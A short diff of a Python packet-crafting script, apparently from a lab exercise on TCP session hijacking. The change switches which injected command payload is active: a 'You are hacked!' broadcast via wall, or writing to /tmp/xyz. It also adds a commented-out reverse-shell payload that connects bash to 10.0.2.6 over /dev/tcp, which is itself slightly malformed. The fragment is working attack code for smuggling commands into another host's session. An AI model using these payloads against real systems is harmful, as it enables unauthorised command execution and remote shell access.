@@ -82,8 +82,9 @@ send_ack_packet(source_ip, destination_ip, source_port_first, destination_port_f
 
 # Define TCP data to be sent in the 4th packet
 # tcp_payload = b"9090\x00seed\x00seed\x00touch /tmp/xyz\x00"
-tcp_payload = b"9090\x00seed\x00seed\x00echo 'You are hacked!' | wall\x00"
-# tcp_payload = b"9090\x00seed\x00seed\x00echo 'You are hacked!' > /tmp/xyz\x00"
+# tcp_payload = b"9090\x00seed\x00seed\x00echo 'You are hacked!' | wall\x00"
+tcp_payload = b"9090\x00seed\x00seed\x00echo 'You are hacked!' > /tmp/xyz\x00"
+# tcp_payload = b"9090\x00seed\x00seed\x00\/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1x00"
 
 # Send custom TCP data packet
 send_custom_packet(source_ip, destination_ip, source_port_first, destination_port_first, sequence_number, ack_number, tcp_payload)
